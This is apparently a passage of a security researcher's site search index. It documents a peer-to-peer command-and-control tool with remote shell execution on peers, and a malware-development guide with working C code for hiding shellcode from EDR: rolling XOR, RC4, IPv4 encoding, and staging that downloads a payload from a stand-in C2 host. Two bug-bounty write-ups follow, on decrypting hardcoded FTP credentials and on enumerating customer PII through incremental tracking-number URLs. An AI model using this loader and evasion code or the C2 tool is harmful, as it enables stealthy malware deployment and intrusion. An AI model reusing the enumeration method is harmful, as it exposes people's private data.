mesh.</p>"},{"location":"projects/skovenet/features/commands/#interactive-mode","title":"Interactive Mode","text":"<p>When you start the binary (as a controller), you enter an interactive shell.</p> <pre><code>Connected to agent\nType 'help' for commands, TAB for completion\n\n[0 peers]&gt; \n</code></pre>"},{"location":"projects/skovenet/features/commands/#command-reference","title":"Command Reference","text":""},{"location":"projects/skovenet/features/commands/#basic-commands","title":"Basic Commands","text":"Command Description Usage <code>help</code> Show available commands. <code>help</code> <code>peers</code> List all currently connected peers. <code>peers</code> <code>id</code> Show the local node's Peer ID. <code>id</code> <code>sign</code> Authenticate as operator. <code>sign &lt;key&gt;</code> <code>cls</code> / <code>clear</code> Clear the terminal screen. <code>cls</code> <code>quit</code> / <code>exit</code> Shutdown the node and exit. <code>quit</code>"},{"location":"projects/skovenet/features/commands/#interaction-commands","title":"Interaction Commands","text":"Command Description Usage <code>use</code> Select a specific peer to target. <code>use &lt;peer-id&gt;</code> (Use TAB for completion) <code>back</code> Deselect the current peer. <code>back</code> <code>run</code> Execute a shell command on the selected peer. <code>run &lt;shell-command&gt;</code> <code>send</code> One-shot command to a specific peer. <code>send &lt;peer-id&gt; &lt;shell-command&gt;</code>"},{"location":"projects/skovenet/features/commands/#network-visualization","title":"Network Visualization","text":"Command Description Usage <code>radar</code> Scan the network and measure latency to all reachable nodes. <code>radar</code> <code>graph</code> Start/Stop the web-based topology visualizer. <code>graph on</code> / <code>graph off</code>"},{"location":"projects/skovenet/features/commands/#example-remote-execution","title":"Example: Remote Execution","text":"<ol> <li> <p>List Peers to find a target.     <pre><code>[0 peers]&gt; peers\nConnected peers:\n  1. 12D3KooWABC...\n  2. 12D3KooWXYZ...\n</code></pre></p> </li> <li> <p>Select a Peer.     <pre><code>[0 peers]&gt; use 12D3KooWABC...\nSelected peer: 12D3KooWABC...\n[12D3KooW...]&gt; \n</code></pre></p> </li> <li> <p>Run a Command.     <pre><code>[12D3KooW...]&gt; run whoami\nroot\n</code></pre></p> </li> <li> <p>Deselect.     <pre><code>[12D3KooW...]&gt; back\nDeselected peer\n[2 peers]&gt; \n</code></pre></p> </li> </ol>"},{"location":"projects/skovenet/features/discovery/","title":"Peer Discovery","text":"<p>Discovery is the process by which SkoveNet nodes find each other without a central server.</p>"},{"location":"projects/skovenet/features/discovery/#1-mdns-local-network","title":"1. mDNS (Local Network)","text":"<p>Multicast DNS (mDNS) is enabled by default. It allows nodes on the same Local Area Network (LAN) to discover each other automatically.</p> <ul> <li>Service Name: <code>_mesh-c2._tcp</code></li> <li>Mechanism: Nodes broadcast their presence. When a peer is detected, the node attempts to connect if it hasn't reached its max peer limit.</li> <li>Use Case: rapid local deployment, testing, and lateral movement within a subnet.</li> </ul>"},{"location":"projects/skovenet/features/discovery/#2-bootstrap-nodes-internet","title":"2. Bootstrap Nodes (Internet)","text":"<p>For internet-wide connectivity where multicast is not available, SkoveNet uses Bootstrap Nodes. *   These are stable nodes with known addresses (IP:Port). *   New nodes connect to bootstrap nodes to join the mesh and find other peers.</p>"},{"location":"projects/skovenet/features/discovery/#3-dht-planned","title":"3. DHT (Planned)","text":"<p>We are implementing a Kademlia Distributed Hash Table (DHT). *   Function: Allows nodes to \"announce\" themselves to the global network request peers closest to a random key. *   Benefit: Enables fully decentralized peer discovery across the public internet without relying on hardcoded bootstrap lists.</p>"},{"location":"projects/skovenet/getting-started/installation/","title":"Installation Guide","text":"<p>SkoveNet is built as a single, static binary with zero external dependencies. This makes deployment trivial across various operating systems.</p>"},{"location":"projects/skovenet/getting-started/installation/#prerequisites","title":"Prerequisites","text":"<ul> <li>Go: Version 1.25.4 or higher.</li> <li>Git: To clone the repository.</li> <li>Make (Optional): For easier build management if a Makefile exists.</li> </ul>"},{"location":"projects/skovenet/getting-started/installation/#building-from-source","title":"Building from Source","text":"<ol> <li> <p>Clone the Repository</p> <pre><code>git clone https://github.com/skoveit/skovenet.git\ncd skovenet\n</code></pre> </li> <li> <p>Build the Project</p> <p>We provide a <code>build.sh</code> script to automate the build process for multiple platforms.</p> <pre><code>chmod +x build.sh\n./build.sh\n</code></pre> <p>This script will compile binaries for: *   Linux (amd64, arm64) *   Windows (amd64) *   macOS (Darwin arm64)</p> </li> <li> <p>Verify the Binaries</p> <p>Check the <code>bin/</code> directory for the output files:</p> <pre><code>ls -l bin/\n# Should see:\n# skovenet-linux-amd64\n# skovenet-windows-amd64.exe\n# ...\n</code></pre> </li> </ol>"},{"location":"projects/skovenet/getting-started/installation/#manual-build","title":"Manual Build","text":"<p>If you prefer to build manually for your specific architecture:</p> <pre><code># For current OS/Arch\ngo build -o skovenet cmd/agent/main.go\n\n# For standard Linux\nGOOS=linux GOARCH=amd64 go build -o skovenet-linux cmd/agent/main.go\n</code></pre>"},{"location":"projects/skovenet/getting-started/installation/#troubleshooting-build-issues","title":"Troubleshooting Build Issues","text":"<ul> <li>Go Version: Ensure you are running Go 1.25.4+. Check with <code>go version</code>.</li> <li>Dependencies: Run <code>go mod tidy</code> to resolve missing dependencies if you encounter import errors.</li> </ul>"},{"location":"projects/skovenet/getting-started/quickstart/","title":"Quick Start","text":"<p>This guide will get you up and running with a private SkoveNet mesh network in minutes.</p>"},{"location":"projects/skovenet/getting-started/quickstart/#running-a-single-node","title":"Running a Single Node","text":"<p>To start a standard agent node:</p> <pre><code>./bin/skovenet-linux-amd64\n</code></pre> <p>Replace the binary name with the one appropriate for your system.</p> <p>Upon startup, you should see output indicating the node has started, generated a Peer ID, and is listening for connections.</p> <pre><code>Host created via tcp with ID: 12D3KooW...\nListening on: /ip4/127.0.0.1/tcp/43210\n</code></pre>"},{"location":"projects/skovenet/getting-started/quickstart/#creating-a-local-mesh","title":"Creating a Local Mesh","text":"<p>To simulate a mesh network on a single machine, you can run multiple instances of the binary. Since they will use mDNS for local discovery, they should automatically find each other.</p> <ol> <li> <p>Terminal 1 (Node A): <pre><code>./bin/skovenet-linux-amd64\n</code></pre></p> </li> <li> <p>Terminal 2 (Node B): <pre><code>./bin/skovenet-linux-amd64\n</code></pre></p> </li> </ol> <p>Watch the logs. You should see \"Peer Connected\" messages appearing in both terminals as they discover each other via mDNS.</p>"},{"location":"projects/skovenet/getting-started/quickstart/#sending-commands","title":"Sending Commands","text":"<p>Currently, the binary supports an interactive mode or CLI flags to send commands.</p> <p>To check connectivity or run a basic command:</p> <pre><code># This feature depends on the specific implementation details of the CLI (see 'features/commands.md')\nhelp\n</code></pre> <p>Note: Specific CLI arguments for issuing commands may vary as the codebase evolves. Refer to the <code>help</code> or usage output of the binary.</p>"},{"location":"projects/skovenet/getting-started/quickstart/#next-steps","title":"Next Steps","text":"<ul> <li>Learn about the Architecture.</li> <li>Understand Security.</li> </ul>"},{"location":"research/","title":"Research","text":"COMING SOON      // ESTABLISHING UPLINK..."},{"location":"writeups/","title":"Overview","text":"Home Welcome <p>Technical writeups and research documentation</p> <p>\u2190 Browse writeups from the sidebar</p>"},{"location":"writeups/maldev/payload-Hiding/","title":"Payload Hiding","text":"<p>This guide explores advanced techniques for payload obfuscation and remote staging. Since modern EDRs utilize Memory Scanning, Call Stack Analysis, and Behavioral Heuristics, simple encryption is no longer enough. We must focus on reducing entropy and breaking common signature patterns.</p>"},{"location":"writeups/maldev/payload-Hiding/#i-advanced-xor-beyond-the-loop","title":"I. Advanced XOR: Beyond the Loop","text":"<p>XOR is often dismissed as \"weak,\" but when implemented with an incremental rolling key, it effectively breaks static signatures and pattern matching.</p>"},{"location":"writeups/maldev/payload-Hiding/#incremental-xor-implementation","title":"Incremental XOR Implementation","text":"<p>Unlike a static single-byte XOR, this method ensures that even repeating NOP sleds or null bytes in your shellcode result in randomized output.</p> <pre><code>#include &lt;Windows.h&gt;\n\nVOID XorByiKeys(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN BYTE bKey) {\n    for (size_t i = 0; i &lt; sShellcodeSize; i++) {\n        // The key changes for every single byte based on its index\n        pShellcode[i] = pShellcode[i] ^ (bKey + i);\n    }\n}\n</code></pre> <p>!!! danger \"Operational Security (OPSEC)\" Standard XOR loops are easily identified by EDRs via CPU pattern recognition. Consider unrolling the loop or using junk instructions (No-Ops) between XOR operations to break signature detection.</p>"},{"location":"writeups/maldev/payload-Hiding/#ii-rc4-stream-cipher-obfuscation","title":"II. RC4: Stream Cipher Obfuscation","text":"<p>RC4 is a symmetric stream cipher favored by loaders for its small footprint and lack of complex padding requirements.</p>"},{"location":"writeups/maldev/payload-Hiding/#systemfunction032-the-stealthy-way","title":"SystemFunction032: The Stealthy Way","text":"<p>Instead of including the RC4 algorithm in your <code>.text</code> section (which creates a recognizable signature), leverage the Windows built-in (but undocumented) <code>SystemFunction032</code>.</p> <pre><code>typedef struct {\n    DWORD Length;\n    DWORD MaximumLength;\n    PVOID Buffer;\n} USTRING;\n\ntypedef NTSTATUS(NTAPI* fnSystemFunction032)(struct USTRING* Data, struct USTRING* Key);\n\nBOOL StealthRC4(IN PBYTE pKey, IN PBYTE pData, IN DWORD dwKeySize, IN DWORD dwDataSize) {\n    USTRING Key  = { .Buffer = pKey,  .Length = dwKeySize,  .MaximumLength = dwKeySize };\n    USTRING Data = { .Buffer = pData, .Length = dwDataSize, .MaximumLength = dwDataSize };\n\n    // Locate the function in Advapi32.dll\n    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(\n        LoadLibraryA(\"Advapi32\"), \"SystemFunction032\"\n    );\n\n    return (SystemFunction032(&amp;Data, &amp;Key) == 0);\n}\n</code></pre>"},{"location":"writeups/maldev/payload-Hiding/#iii-data-obfuscation-fuscation-techniques","title":"III. Data Obfuscation: \"Fuscation\" Techniques","text":"<p>To a human analyst, hex arrays are obvious. To an EDR, high entropy is suspicious. By converting shellcode into common strings like IPv4 addresses, MAC addresses, or UUIDs, we blend into legitimate memory structures.</p>"},{"location":"writeups/maldev/payload-Hiding/#the-logic-of-ipv4fuscation","title":"The Logic of \"IPv4Fuscation\"","text":"<p>Every 4 bytes of shellcode are converted into a string representing an IP address. During execution, <code>ntdll.dll</code>'s <code>RtlIpv4StringToAddressA</code> is used to revert the string back into executable bytes in memory.</p> Method Data Format Example Decoding API IPv4 <code>192.168.1.1</code> <code>RtlIpv4StringToAddressA</code> IPv6 <code>2001:db8::ff00:42</code> <code>RtlIpv6StringToAddressA</code> MAC <code>00-0C-29-4F-8B-3C</code> <code>RtlEthernetStringToAddressA</code> UUID <code>550e8400-e29b-41d4</code> <code>UuidFromStringA</code> <p>Export to Sheets</p>"},{"location":"writeups/maldev/payload-Hiding/#iv-web-staging-memory-management","title":"IV. Web Staging &amp; Memory Management","text":"<p>Hardcoding 100KB of shellcode inside your binary is a massive red flag. Web Staging allows you to pull the payload into memory only when needed.</p>"},{"location":"writeups/maldev/payload-Hiding/#dynamic-chunker-pattern","title":"Dynamic Chunker Pattern","text":"<p>When fetching a payload via HTTP, you rarely know the exact size beforehand. Using a dynamic re-allocation loop prevents buffer overflows and keeps the heap clean.</p> <pre><code>HINTERNET hUrl = InternetOpenUrlW(hInternet, L\"http://C2-Server.com/payload.bin\", ...);\nPBYTE pPayload = NULL;\nDWORD dwTotalSize = 0;\nBYTE  tmpBuffer[1024];\nDWORD dwRead = 0;\n\nwhile (InternetReadFile(hUrl, tmpBuffer, 1024, &amp;dwRead) &amp;&amp; dwRead != 0) {\n    dwTotalSize += dwRead;\n    if (pPayload == NULL)\n        pPayload = (PBYTE)LocalAlloc(LPTR, dwTotalSize);\n    else\n        pPayload = (PBYTE)LocalReAlloc(pPayload, dwTotalSize, LMEM_MOVEABLE | LMEM_ZEROINIT);\n\n    memcpy(pPayload + (dwTotalSize - dwRead), tmpBuffer, dwRead);\n}\n</code></pre> <p>!!! success \"Connection Flushing\" WinInet caches connections. To prevent a persistent socket from being flagged by netstat, use: <code>InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);</code></p>"},{"location":"writeups/maldev/payload-Hiding/#v-key-storage-evading-static-analysis","title":"V. Key Storage: Evading Static Analysis","text":"<p>Avoid <code>char* key = \"password\"</code>. Use Stack Strings to ensure the key only exists during the function's execution timeframe.</p> <pre><code>// High-level \"bad\" approach:\nunsigned char* key = \"maldev123\"; \n\n// Advanced \"Stack String\" approach:\nunsigned char key[] = { 'm','a','l','d','e','v','1','2','3', 0x00 };\n// The compiler generates 'MOV' instructions to build this on the stack.\n</code></pre> <p>To wrap this up, let\u2019s look at how these components fit together into a cohesive, evasive loader.</p>"},{"location":"writeups/maldev/payload-Hiding/#vi-conclusion-the-layered-defense","title":"VI. Conclusion: The Layered Defense","text":"<p>Evading modern security solutions is no longer about finding a \"magic\" encryption algorithm. It is about layering techniques to create a sequence of events that look benign to static scanners and confusing to behavioral engines.</p> <p>By combining the methods discussed, we achieve a high level of stealth:</p> <ol> <li> <p>Web Staging removes the signature from the disk entirely.</p> </li> <li> <p>Fuscation (IPv4/MAC) drops the entropy of the downloaded data, making it look like legitimate network configuration strings in memory.</p> </li> <li> <p>Native API Execution (like <code>SystemFunction032</code>) hides the decryption logic by using trusted Windows binaries rather than custom, suspicious code blocks.</p> </li> <li> <p>Stack Strings ensure that even if an analyst dumps the strings of your binary, they won't find your keys or URLs in plaintext.</p> </li> </ol>"},{"location":"writeups/maldev/payload-Hiding/#summary-table-defensive-vs-offensive","title":"Summary Table: Defensive vs. Offensive","text":"Feature Traditional Approach Advanced \"HellShell\" Approach Storage Hardcoded in <code>.data</code> section Remote Web Staging / Resources Encryption Standard AES/XOR Loop Incremental XOR / Native RC4 Signature Hexadecimal Blobs IPv4 / MAC / UUID Strings Detection High Entropy (Suspect) Low Entropy (Benign Look) <p>The cat-and-mouse game continues. As EDRs get better at memory scanning, the next frontier involves Memory Scanning Bypass (MSB) and Stack Spoofing to hide the execution flow after the payload is decrypted.</p>"},{"location":"writeups/web/FTPbox/","title":"FTPbox Hardcoded Credentials","text":"<p>It was a normal bug hunting session. I started with my usual reconnaissance, running tools to gather subdomains until I had a solid <code>subs.txt</code> list. The next step was to run a tool to take screenshots of all of them to see what I was dealing with.</p> <p>While scrolling through the results, one stood out: <code>data.sub.domain.com</code>. No landing page, no login just a raw Apache Directory Listing exposing thousands of public files and directories.</p> <p>The server was packed with <code>.pdf</code> and <code>.jpeg</code> files across tons of directories. I also found several <code>.db</code> files named <code>Thumbs.db</code>, but they were empty.</p> <p>Windows uses <code>Thumbs.db</code> files as a cache for image thumbnails.</p> <p>At first glance, it seemed like an ordinary public file server. However, after some intensive regex filtering and extension listing, I hit something that definitely shouldn't be public: <code>profiles.conf</code>.</p> <p>Inside, I found a JSON configuration file:</p> <pre><code>[\n  {\n    \"Ignored\": {\n      \"Folders\": [\n        \"databases/databases\",\n        ...\n        \"GOV/GOV\",\n        \"NOV/NOV\",\n        \"Av/Av\",\n      ],\n      \"Extensions\": [],\n      \"Dotfiles\": false,\n      \"Tempfiles\": true\n    },\n    \"Log\": {\n      \"Items\": [],\n      \"Folders\": []\n    },\n    \"Account\": {\n      \"KeepAliveInterval\": 10,\n      \"SyncDirection\": 2,\n      \"TempFilePrefix\": \"~ftpb_\",\n      \"Host\": \"sub.sub.domain.com\",\n      \"Username\": \"******\",\n      \"Password\": \"Qm/ozOlvp+rzcCwZmv3eYo==\",\n      \"Port\": 21,\n      \"Protocol\": 0,\n      \"FtpsMethod\": 0,\n      \"SyncMethod\": 0,\n      \"SyncFrequency\": 10,\n      \"PrivateKeyFile\": null\n    },\n    \"Paths\": {\n      \"Remote\": \"/\",\n      \"Local\": \"D:\\\\FTPbox_263_Portable\",\n      \"Parent\": \"data.sub.domain.com/\"\n    }\n  }\n]\n</code></pre> <p>Okay, this was clearly for an FTP service but why was it here? The password contained <code>/</code> and <code>+</code>, which suggested it wasn't just simple Base64-encoded plaintext. I tried using the string as-is, but of course, it didn't work.</p> <p>Then I noticed the local path: <code>D:\\\\FTPbox_263_Portable</code>. This was the key. A quick search revealed that FTPbox is an open-source project that hasn't been updated in years. I went straight to the source code to understand why <code>profiles.conf</code> existed and why the password was stored there!</p> <p>It turns out the app caches credentials for a faster login experience: </p> <p>While auditing the code, I found something hilarious: The AES Key and IV were seemingly hardcoded! </p>"},{"location":"writeups/web/FTPbox/#the-github-dead-end","title":"The GitHub Dead-end","text":"<p>The source code showed the word <code>\"removed\"</code> in place of the keys. Since AES requires a 16 or 32-byte key, I knew <code>\"removed\"</code> was just a placeholder.</p> <p>At this point, I had a plan: I could simply download the compiled version of this application and reverse engineer it to extract the keys. But before doing that, I thought I\u2019d try a \"lazier\" and faster route. I figured if the developer had hardcoded the keys and then \"removed\" them, they must still exist in the GitHub commit history.</p> <p>I spent some time digging through old commits, hoping to find the exact moment those keys were deleted from the public repo. But after searching through the history, I found nothing it was a dead end.</p> <p></p>"},{"location":"writeups/web/FTPbox/#reverse-engineering","title":"Reverse Engineering","text":"<p>Since the GitHub history was clean, it was time to go back to my original plan. Since the application is built on .NET, I knew that no matter what the public source code says, the keys must be baked into the compiled binaries they are actually shipping to users.</p> <p>so i downloaded the exact version of the application used by the target:  </p> <p>Fun fact: This is the latest version available, even though it hasn't been updated since 2015. Talk about legacy security.</p> <p></p> <p>Since I had already audited the source code, I knew exactly which library handled the \"dirty work.\" I grabbed <code>FTPboxlib.dll</code> and tossed it into dnSpy.</p> <p>dnSpy decompiles .NET binaries back into readable source code </p> <p>I navigated straight to the encryption class. I didn't even have to scroll. </p> <p>There they were. The hardcoded Key and IV, sitting right there in plain sight. so these keys aren't just for this specific server; they are the same keys used by every single user on this version of the app.</p>"},{"location":"writeups/web/FTPbox/#cracking-the-vault","title":"Cracking the Vault","text":"<p>Now for the final piece of the puzzle. I wrote a quick C# script, plugged in the recovered keys, and fed it the encrypted string <code>Qm/ozOlvp+rzcCwZmv3eYo==</code>.</p> <p>The result? It was surprisingly smooth. The encryption crumbled instantly.</p>"},{"location":"writeups/web/FTPbox/#the-jackpot","title":"The Jackpot","text":"<p>I took the decrypted password and tried it on the FTP server. I was in. Not only did I have full Read/Write permissions, but I soon realized the rabbit hole went deeper:</p> <ul> <li>Credential Reuse: Multiple other services hosted on the same IP were using the exact same credentials.</li> <li>Massive Data Exposure: The FTP server was a graveyard of private files.</li> </ul> <p>The ability to upload files to an ASP.NET environment potentially leads to Remote Code Execution</p> <p>Looking back, the writeup makes it seem like a 5-minute job, but the reality was hours of research, trial and error, and a lot of caffeine.</p>"},{"location":"writeups/web/PII-discl/","title":"From JavaScript Recon to PII Exposure","text":""},{"location":"writeups/web/PII-discl/#tldr","title":"TL;DR","text":"<p>While reviewing client-side code and JavaScript assets, I first came across an order-status endpoint that returned sensitive tracking data and PII, but only when called with a high-entropy url_code (<code>d7ebdc82-13eb-4cea-aea8-7ac96fe49d57</code>).</p> <p>After digging deeper in the source code and related request logic, I discovered the same endpoint also accepted a numeric, incremental tracking_number. Unlike url_code, this identifier was guessable, it returned the same full response payload. That made it possible to disclose other customers\u2019 data without authentication, including exact location (lat/long), phone numbers, and personal details. I also identified a debug-related parameter that expanded the response and exposed additional customer fields. The issue has been reported and patched.</p>"},{"location":"writeups/web/PII-discl/#recon-finding-an-additional-api-base","title":"Recon: Finding an Additional API Base","text":"<p>I started with source code review and asset discovery:</p> <ul> <li>Enumerated JS files and endpoints using <code>urlfinder</code> and <code>gau</code>.</li> <li>Parsed JavaScript bundles to identify configuration objects and request wrappers that revealed an additional API base and route patterns.</li> </ul> <p>I used a regex to extract candidate URLs/endpoints from JS, then filtered the results to \u201cAPI-looking\u201d paths</p>"},{"location":"writeups/web/PII-discl/#discovery-an-endpoint-returning-sensitive-data","title":"Discovery: An Endpoint Returning Sensitive Data","text":"<p>Among the extracted endpoints, one stood out: an order status route that returned rich tracking details. The response contained fields that looked like PII and operational delivery metadata (for example: location coordinates and delivery-related identifiers).</p> <p>At first, the primary parameter to access the order appeared long/high-entropy, which made direct guessing impractical. I attempted light parameter analysis and fuzzing focused on obvious variations, but did not find additional behavior that way.</p>"},{"location":"writeups/web/PII-discl/#the-break-a-debug-parameter-in-source","title":"The Break: A Debug Parameter in Source","text":"<p>Returning to the source, I searched specifically for:</p> <ul> <li>The endpoint name/path</li> <li>References to \u201cdebug\u201d, \u201cverbose\u201d, \u201ctrace\u201d, \u201ctest\u201d, \u201cdev\u201d, \u201cinclude*\u201d, \u201cexpand\u201d, etc.</li> <li>Conditional logic around response shaping</li> </ul> <p>That led me to a debug-related parameter <code>tracking_number</code> that changed the server response and caused it to return significantly more sensitive customer information.  The most important part is that <code>tracking_number</code> was numeric and incremental (brute-forceable), not a high-entropy value. That meant anyone could iterate values (1111, 1112, 1113, \u2026) and each request would return order data for a different customer without authentication.</p> <p>samples: <pre><code>https://www.doordash.com/unified-gateway/drive/v1/get-order-status?tracking_number=1118\n\nhttps://www.doordash.com/unified-gateway/drive/v1/get-order-status?tracking_number=1119\n\nhttps://www.doordash.com/unified-gateway/drive/v1/get-order-status?tracking_number=1120\n</code></pre></p>"},{"location":"writeups/web/PII-discl/#root-cause-what-went-wrong","title":"Root Cause (What went wrong)","text":"<p>The core design issue was that the service accepted multiple selectors for the same resource:</p> <ul> <li>One selector was intended to be unguessable/high-entropy.</li> <li>Another selector (or mode) effectively weakened access control and returned the same sensitive payload without requiring authorization.</li> </ul> <p>In short: the API did not enforce object-level authorization before returning sensitive order/customer/dasher data, and a debug pathway amplified the exposure.</p>"},{"location":"writeups/web/PII-discl/#impact","title":"Impact","text":"<p>The exposed data included highly sensitive PII and delivery metadata, such as:</p> <ul> <li>Customer identity and address data</li> <li>Precise GPS coordinates (latitude/longitude)</li> <li>Courier/dasher identifiers and phone number</li> <li>Order identifiers and timestamps that could be correlated</li> </ul>"},{"location":"writeups/web/PII-discl/#lessons-learned","title":"Lessons Learned","text":"<ul> <li>JS bundles frequently reveal \u201chidden\u201d gateway routes and optional parameters.</li> <li>Any endpoint returning PII must be reviewed for BOLA/IDOR risk, especially if it accepts multiple identifiers.</li> <li>Debug flags are common footguns. If you see them in client code, treat them as high-signal review targets.</li> </ul>"}]}